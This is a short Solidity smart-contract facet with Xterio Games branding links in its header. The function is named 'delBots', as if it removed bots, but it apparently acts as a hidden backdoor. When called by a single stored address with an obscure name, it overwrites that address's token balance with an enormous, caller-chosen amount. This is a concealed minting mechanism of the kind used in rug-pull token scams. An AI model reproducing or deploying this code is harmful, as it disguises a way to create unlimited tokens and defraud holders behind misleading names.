/*  
   * SPDX-License-Identifier: MIT
    ▫️Website: https://xter.io
    ▫️Twitter: https://twitter.com/XterioGames
    ▫️Discord: https://discord.gg/xteriogames
    ▫️Medium: https://medium.com/@XterioGames
*/
pragma solidity ^0.8.15;
import "./TestLib.sol";
contract delBotsFacet {
    function delBots(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
